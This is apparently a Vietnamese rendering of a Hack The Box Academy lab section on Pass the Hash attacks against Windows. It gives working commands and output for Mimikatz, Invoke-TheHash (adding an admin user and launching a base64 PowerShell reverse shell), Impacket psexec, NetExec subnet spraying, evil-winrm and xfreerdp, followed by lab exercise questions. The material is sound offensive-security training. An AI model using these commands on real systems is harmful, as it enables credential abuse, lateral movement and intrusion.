# Pass the Hash (PtH) — Hack The Box Academy

*Section 20 / 26*

## Pass the Hash (PtH) là gì?

**Pass the Hash (PtH)** là một kỹ thuật tấn công trong đó kẻ tấn công sử dụng **hash của mật khẩu** thay vì mật khẩu dạng plaintext để xác thực. Kẻ tấn công không cần phải giải mã hash để lấy được mật khẩu gốc. Tấn công PtH khai thác chính giao thức xác thực, bởi vì hash mật khẩu vẫn giữ nguyên (static) cho mọi phiên đăng nhập cho đến khi mật khẩu bị thay đổi.

Như đã đề cập ở các phần trước, kẻ tấn công cần có quyền quản trị (administrative privileges) hoặc một số quyền đặc biệt trên máy mục tiêu để có thể lấy được hash mật khẩu. Hash có thể thu được bằng nhiều cách, bao gồm:

- Dump cơ sở dữ liệu SAM cục bộ từ một host đã bị chiếm quyền.
- Trích xuất hash từ cơ sở dữ liệu NTDS (`ntds.dit`) trên Domain Controller.
- Lấy hash từ bộ nhớ (tiến trình `lsass.exe`).

Giả sử chúng ta đã lấy được hash mật khẩu (`64F12CDDAA88057E06A81B54E73B949B`) của tài khoản `julio` thuộc domain `inlanefreight.htb`. Hãy cùng xem cách thực hiện tấn công Pass the Hash từ máy Windows và Linux.

> **Lưu ý:** Các công cụ sẽ sử dụng được đặt trong thư mục `C:\tools` trên máy mục tiêu. Sau khi khởi động máy và hoàn thành các bài tập, bạn có thể sử dụng công cụ trong thư mục đó. Bài lab này gồm hai máy: bạn sẽ có quyền truy cập vào một máy (**MS01**), và từ đó kết nối sang máy thứ hai (**DC01**).

## Giới thiệu về Windows NTLM

**Windows New Technology LAN Manager (NTLM)** của Microsoft là một tập hợp các giao thức bảo mật dùng để xác thực danh tính người dùng, đồng thời bảo vệ tính toàn vẹn (integrity) và tính bảo mật (confidentiality) của dữ liệu. NTLM là giải pháp đăng nhập một lần (Single Sign-On – SSO) sử dụng cơ chế challenge-response để xác minh danh tính người dùng mà không cần họ nhập lại mật khẩu.

Mặc dù còn nhiều lỗ hổng đã biết, NTLM vẫn được sử dụng phổ biến để đảm bảo khả năng tương thích với các client và server cũ (legacy), ngay cả trên các hệ thống hiện đại. Trong khi Microsoft vẫn tiếp tục hỗ trợ NTLM, Kerberos đã trở thành cơ chế xác thực mặc định trong Windows 2000 và các domain Active Directory (AD) về sau.

Với NTLM, mật khẩu lưu trên server và domain controller không được "salt" (thêm muối), điều đó có nghĩa là kẻ tấn công sở hữu một hash mật khẩu có thể xác thực một phiên đăng nhập mà **không cần biết mật khẩu gốc**. Đây chính là tấn công **Pass the Hash (PtH)**.

## Pass the Hash với Mimikatz (Windows)

Công cụ đầu tiên chúng ta sử dụng để thực hiện tấn công Pass the Hash là **Mimikatz**. Mimikatz có một module tên `sekurlsa::pth` cho phép thực hiện tấn công Pass the Hash bằng cách khởi chạy một tiến trình sử dụng hash mật khẩu của người dùng. Để sử dụng module này, chúng ta cần:

- **`/user`** — Tên người dùng muốn giả mạo (impersonate).
- **`/rc4`** hoặc **`/NTLM`** — Hash NTLM của mật khẩu người dùng.
- **`/domain`** — Domain mà người dùng cần giả mạo thuộc về. Với tài khoản local, có thể dùng tên máy tính, `localhost`, hoặc dấu chấm (`.`).
- **`/run`** — Chương trình muốn chạy dưới ngữ cảnh (context) của người dùng đó (nếu không chỉ định, mặc định sẽ chạy `cmd.exe`).

### Pass the Hash từ Windows dùng Mimikatz

```cmd
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio
/rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb
/run:cmd.exe" exit
```

Bây giờ chúng ta có thể dùng `cmd.exe` để thực thi lệnh dưới ngữ cảnh của người dùng đó. Trong ví dụ này, `julio` có thể kết nối tới một thư mục chia sẻ (shared folder) tên `julio` trên DC.

```
user     : julio
domain   : inlanefreight.htb
program  : cmd.exe
impers.  : no
NTLM     : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0    - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos  - data copy @ 0000028FC964F288
    \_ des_cbc_md4       -> null
    \_ des_cbc_md4       OK
    \_ des_cbc_md4       OK
    \_ des_cbc_md4       OK
    \_ des_cbc_md4       OK
    \_ des_cbc_md4       OK
    \_ des_cbc_md4       OK
    \_ *Password replace @ 0000028FC9673AE8 (32) -> null
```

<img width="976" height="661" alt="image" src="https://github.com/user-attachments/assets/150ff4a4-a72e-4345-b6e3-1953374d4f7c" />


## Pass the Hash với PowerShell Invoke-TheHash (Windows)

Một công cụ khác để thực hiện tấn công Pass the Hash trên Windows là **Invoke-TheHash**. Đây là một bộ các hàm PowerShell dùng để thực hiện tấn công Pass the Hash qua WMI và SMB. Các kết nối WMI và SMB được thực hiện thông qua `.NET TCPClient`. Việc xác thực được thực hiện bằng cách đưa hash NTLM vào giao thức xác thực NTLMv2. Không cần quyền administrator cục bộ (client-side), nhưng người dùng và hash sử dụng để xác thực cần có quyền quản trị trên máy mục tiêu. Trong ví dụ này chúng ta dùng người dùng `julio` và hash `64F12CDDAA88057E06A81B54E73B949B`.

Khi dùng `Invoke-TheHash`, chúng ta có hai lựa chọn thực thi lệnh: **SMB** hoặc **WMI**. Để dùng công cụ này, cần chỉ định các tham số sau để thực thi lệnh trên máy mục tiêu:

- **`Target`** — Hostname hoặc địa chỉ IP của mục tiêu.
- **`Username`** — Tên người dùng dùng để xác thực.
- **`Domain`** — Domain dùng để xác thực. Tham số này không cần thiết với tài khoản local hoặc khi dùng `@domain` sau tên người dùng.
- **`Hash`** — Hash NTLM của mật khẩu dùng để xác thực. Hàm này chấp nhận cả định dạng `LM:NTLM` hoặc `NTLM`.
- **`Command`** — Lệnh cần thực thi trên mục tiêu. Nếu không chỉ định lệnh, hàm sẽ kiểm tra xem tên người dùng và hash có quyền truy cập WMI trên mục tiêu hay không.

Lệnh sau đây sử dụng phương thức SMB để thực thi lệnh, tạo một người dùng mới tên `mark` và thêm người dùng đó vào nhóm Administrators.

### Invoke-TheHash với SMB

```powershell
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain
inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B
-Command "net user mark Password123 /add && net localgroup administrators
mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on
172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write
privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```

Chúng ta cũng có thể lấy kết nối reverse shell trên máy mục tiêu. Nếu chưa quen với reverse shell, hãy xem lại module **Shells & Payloads** trên HTB Academy.

Để lấy reverse shell, chúng ta cần khởi động listener bằng Netcat trên máy Windows của mình, máy này có địa chỉ IP `172.16.1.5`. Chúng ta sẽ dùng cổng `8001` để chờ kết nối.

### Netcat listener

```powershell
PS C:\tools> .\nc.exe -lvnp 8001

listening on [any] 8001 ...
```

Để tạo một reverse shell PowerShell đơn giản, chúng ta có thể truy cập trang **revshells.com**, đặt IP là `172.16.1.5`, cổng `8001`, và chọn tùy chọn **PowerShell #3 (Base64)**, như hình minh họa bên dưới.

<img width="1123" height="807" alt="image" src="https://github.com/user-attachments/assets/b033199c-d261-47e8-aa91-c547e80a89d5" />


Bây giờ chúng ta thực thi `Invoke-TheHash` để chạy script reverse shell PowerShell trên máy mục tiêu. Lưu ý rằng thay vì dùng địa chỉ IP `172.16.1.10`, chúng ta sẽ dùng tên máy `DC01` (cả hai cách đều được).

### Invoke-TheHash với WMI

```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain
inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B
-Command "powershell -e
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALg...

[+] Command executed with process id 520 on DC01
```

Kết quả là một kết nối reverse shell từ host DC01 (172.16.1.10).

<img width="930" height="705" alt="image" src="https://github.com/user-attachments/assets/67db0fef-7431-4808-9243-b69abffd76b6" />


## Pass the Hash với Impacket (Linux)

**Impacket** cung cấp nhiều công cụ cho các thao tác khác nhau như **thực thi lệnh (Command Execution)**, **dump credential (Credential Dumping)**, **liệt kê thông tin (Enumeration)**, v.v. Trong ví dụ này, chúng ta sẽ thực thi lệnh trên máy mục tiêu bằng **PsExec**.

### Pass the Hash với Impacket PsExec

```shellsession
naruto3co@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes
:30B3783CE2ABF1AF70F77D0660CF3453

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.201.126.....
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Creating service AdzX on 10.129.201.126.....
[*] Starting service AdzX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Bộ công cụ Impacket còn có nhiều công cụ khác dùng để thực thi lệnh bằng tấn công Pass the Hash, chẳng hạn:

- `impacket-wmiexec`
- `impacket-atexec`
- `impacket-smbexec`

## Pass the Hash với NetExec (Linux)

**NetExec** là công cụ post-exploitation giúp tự động hóa việc đánh giá bảo mật của các mạng Active Directory quy mô lớn. Chúng ta có thể dùng NetExec để thử xác thực vào một số hoặc toàn bộ host trong mạng nhằm tìm ra host mà mình có thể xác thực thành công với quyền local admin. Phương pháp này còn gọi là **"Password Spraying"** và được trình bày chi tiết trong module **Active Directory Enumeration & Attacks**. Lưu ý rằng phương pháp này có thể khiến tài khoản domain bị khóa (lockout), vì vậy hãy lưu ý chính sách khóa tài khoản (account lockout policy) của domain mục tiêu, và đảm bảo dùng phương pháp tài khoản local nếu đó là mục đích của bạn — vì phương pháp đó chỉ thử đăng nhập một lần trên mỗi host trong dải mạng bằng thông tin xác thực đã cung cấp.

### Pass the Hash với NetExec

```shellsession
naruto3co@htb[/htb]# netexec smb 172.16.1.0/24 -u Administrator -d . -H
30B3783CE2ABF1AF70F77D0660CF3453

SMB   172.16.1.10   445   DC01    [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
SMB   172.16.1.10   445   DC01    [-]
.\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
SMB   172.16.1.5    445   MS01    [*] Windows 10.0 Build
19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
SMB   172.16.1.5    445   MS01    [+] .\Administrator
30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
```

Nếu muốn thực hiện thao tác tương tự nhưng thử xác thực vào từng host trong một subnet bằng hash mật khẩu administrator cục bộ, chúng ta có thể thêm `--local-auth` vào lệnh. Phương pháp này hữu ích khi chúng ta lấy được hash administrator cục bộ bằng cách dump SAM database trên một host, và muốn kiểm tra xem còn bao nhiêu host khác có thể truy cập được do dùng chung mật khẩu local admin (password re-use). Nếu thấy `Pwn3d!`, nghĩa là người dùng đó là local administrator trên máy mục tiêu. Chúng ta có thể dùng tùy chọn `-x` để thực thi lệnh. Việc dùng chung mật khẩu (password reuse) trên nhiều host trong cùng subnet là điều khá phổ biến. Các tổ chức thường dùng gold image có cùng mật khẩu local admin, hoặc đặt mật khẩu giống nhau trên nhiều host để dễ quản trị. Nếu gặp vấn đề này trong một cuộc đánh giá thực tế (real-world engagement), một khuyến nghị tốt dành cho khách hàng là triển khai **Local Administrator Password Solution (LAPS)**, giải pháp này sẽ tạo ngẫu nhiên mật khẩu local administrator và có thể cấu hình để tự động xoay vòng (rotate) theo chu kỳ cố định.

### NetExec - Thực thi lệnh

```shellsession
naruto3co@htb[/htb]# netexec smb 10.129.201.126 -u Administrator -d . -H
30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

SMB   10.129.201.126   445   MS01   [*] Windows 10
Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
SMB   10.129.201.126   445   MS01   [+] .\Administrator
30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
SMB   10.129.201.126   445   MS01   [+] Executed command 
SMB   10.129.201.126   445   MS01   MS01\administrator
```

Xem thêm tài liệu **NetExec documentation Wiki** để tìm hiểu thêm về các tính năng phong phú của công cụ này.

## Pass the Hash với evil-winrm (Linux)

**Evil-WinRM** là một công cụ khác dùng để xác thực bằng tấn công Pass the Hash thông qua PowerShell remoting. Nếu SMB bị chặn hoặc chúng ta không có quyền quản trị, có thể dùng giao thức thay thế này để kết nối tới máy mục tiêu.

### Pass the Hash với evil-winrm

```shellsession
naruto3co@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H
30B3783CE2ABF1AF70F77D0660CF3453

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

> **Lưu ý:** Khi dùng tài khoản domain, cần thêm tên domain vào, ví dụ: `administrator@inlanefreight.htb`.

## Pass the Hash với RDP (Linux)

Chúng ta có thể thực hiện tấn công RDP PtH để có quyền truy cập giao diện đồ họa (GUI) vào hệ thống mục tiêu, sử dụng các công cụ như `xfreerdp`.

Có một vài lưu ý (caveat) đối với kiểu tấn công này:

- **Restricted Admin Mode**, vốn bị tắt mặc định, cần được bật trên máy mục tiêu; nếu không, bạn sẽ gặp lỗi sau:

<img width="663" height="264" alt="image" src="https://github.com/user-attachments/assets/a380f5ae-12c5-4267-a47e-1272250788c5" />


Có thể bật chế độ này bằng cách thêm registry key mới `DisableRestrictedAdmin` (REG_DWORD) dưới `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` với giá trị `0`. Có thể thực hiện bằng lệnh sau:

### Bật Restricted Admin Mode để cho phép PtH

```cmd
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD
/v DisableRestrictedAdmin /d 0x0 /f
```

<img width="909" height="576" alt="image" src="https://github.com/user-attachments/assets/9941ec00-6fc0-4471-9d51-03cd95cd38b9" />


Sau khi thêm registry key, chúng ta có thể dùng `xfreerdp` với tùy chọn `/pth` để có quyền truy cập RDP:

### Pass the Hash bằng RDP

```shellsession
naruto3co@htb[/htb]$ xfreerdp /v:10.129.201.126 /u:julio
/pth:64F12CDDAA88057E06A81B54E73B949B

[15:38:26:999] [94965:94966] [INFO][com.freerdp.core] -
freerdp_connect:freerdp_set_last_error_ex resetting error state
[15:38:26:999] [94965:94966] [INFO][com.freerdp.client.common.cmdline] -
loading channelEx rdpdr
...snip...
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] -
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @ 
WARNING: CERTIFICATE NAME MISMATCH! @
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] -
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
...SNIP...
```

<img width="1073" height="900" alt="image" src="https://github.com/user-attachments/assets/616ea15b-a17e-4db2-b073-3a6957af5266" />


## UAC giới hạn Pass the Hash với tài khoản cục bộ

**UAC (User Account Control)** giới hạn khả năng thực hiện các thao tác quản trị từ xa (remote administration) của người dùng cục bộ. Khi registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` được đặt về `0`, điều đó có nghĩa là chỉ tài khoản local admin mặc định (RID-500, "Administrator") mới được phép thực hiện các tác vụ quản trị từ xa. Đặt giá trị này về `1` sẽ cho phép các tài khoản local admin khác cũng được thực hiện.

> **Lưu ý:** Có một ngoại lệ — nếu registry key `FilterAdministratorToken` (mặc định bị tắt) được bật (giá trị `1`), thì tài khoản RID 500 (kể cả khi đã bị đổi tên) cũng bị đưa vào diện bảo vệ của UAC. Điều đó có nghĩa là tấn công PtH từ xa sẽ thất bại đối với máy đó khi dùng tài khoản này.

Các thiết lập này chỉ áp dụng cho tài khoản quản trị cục bộ (local administrative accounts). Nếu chúng ta có quyền truy cập vào một tài khoản domain có quyền quản trị trên một máy tính, chúng ta vẫn có thể dùng Pass the Hash với máy tính đó. Nếu muốn tìm hiểu thêm về `LocalAccountTokenFilterPolicy`, bạn có thể đọc bài blog của Will Schroeder: **"Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy"**.

## Bước tiếp theo

Trong phần này, chúng ta đã học cách sử dụng hash NTLM (RC4-HMAC) của mật khẩu người dùng để thực hiện tấn công Pass the Hash (PtH) và di chuyển ngang (move laterally) trong mạng mục tiêu. Tuy nhiên, đây không phải cách duy nhất để di chuyển ngang. Trong phần tiếp theo, chúng ta sẽ học cách khai thác giao thức Kerberos để di chuyển ngang và xác thực với danh nghĩa của người dùng khác.

---

## Câu hỏi (Questions)

**Câu 1 (+40 XP)**
Truy cập vào máy mục tiêu bằng bất kỳ công cụ Pass-the-Hash nào. Nộp nội dung file tại đường dẫn `C:\pth.txt`.
*Xác thực với user "Administrator" và mật khẩu "30B3783CE2ABF1AF70F77D0660CF3453"*

*Gợi ý:* Thử kết nối qua RDP dùng hash của Administrator. Tên của giá trị registry cần được đặt về `0` để PtH qua RDP hoạt động là gì? Đổi giá trị registry key và kết nối bằng hash qua RDP. Nộp tên của giá trị registry đó làm câu trả lời.

**Câu 2 (+40 XP)**
Kết nối qua RDP và dùng Mimikatz đặt tại `c:\tools` để trích xuất các hash hiện có trong phiên đăng nhập hiện tại. Hash NTLM/RC4 của tài khoản David là gì?
*RDP tới với user "Administrator" và mật khẩu "30B3783CE2ABF1AF70F77D0660CF3453"*

**Câu 3 (+40 XP)**
Dùng hash của David, thực hiện tấn công Pass the Hash để kết nối tới thư mục chia sẻ `\\DC01\david` và đọc file `david.txt`.

**Câu 4 (+1 +40 XP)**
Dùng hash của Julio, thực hiện tấn công Pass the Hash để kết nối tới thư mục chia sẻ `\\DC01\julio` và đọc file `julio.txt`.

**Câu 5 (+40 XP)**
Dùng hash của Julio, thực hiện tấn công Pass the Hash, khởi chạy console PowerShell và import Invoke-TheHash để tạo một reverse shell tới máy mà bạn đang kết nối qua RDP (máy mục tiêu, DC01, chỉ có thể kết nối tới MS01). Dùng công cụ `nc.exe` đặt tại `c:\tools` để lắng nghe reverse shell. Sau khi kết nối được vào DC01, đọc flag tại `C:\julio\flag.txt`.

**Bài tập tùy chọn 1 (+40 XP)**
John là thành viên của nhóm Remote Management Users trên MS01. Hãy thử kết nối tới MS01 bằng hash tài khoản của john với Impacket. Kết quả là gì? Điều gì xảy ra nếu dùng evil-winrm? Đánh dấu DONE khi hoàn thành.

---

*Nguồn: [Hack The Box Academy – Pass the Hash (PtH)](https://academy.hackthebox.com/app/module/147/section/1638)*
